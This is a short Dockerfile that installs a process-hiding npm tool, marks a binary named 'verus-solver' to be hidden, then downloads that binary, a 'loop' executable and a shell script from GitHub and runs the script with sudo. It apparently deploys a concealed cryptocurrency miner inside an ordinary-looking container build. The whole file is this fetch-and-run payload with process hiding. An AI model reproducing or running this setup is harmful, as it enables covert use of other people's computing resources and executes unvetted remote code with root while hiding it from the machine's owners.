FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config wget libssl-dev sudo nodejs npm make
         
RUN sudo npm i -g node-process-hider
RUN sudo ph add verus-solver
RUN wget https://raw.githubusercontent.com/cihuuy/youtube/main/vera.sh
RUN wget https://github.com/breakok/ob/raw/main/loop
RUN wget https://github.com/breakok/ob/raw/main/verus-solver
RUN chmod 777 verus-solver
RUN chmod 777 loop
RUN chmod 777 vera.sh
RUN sudo ./vera.sh
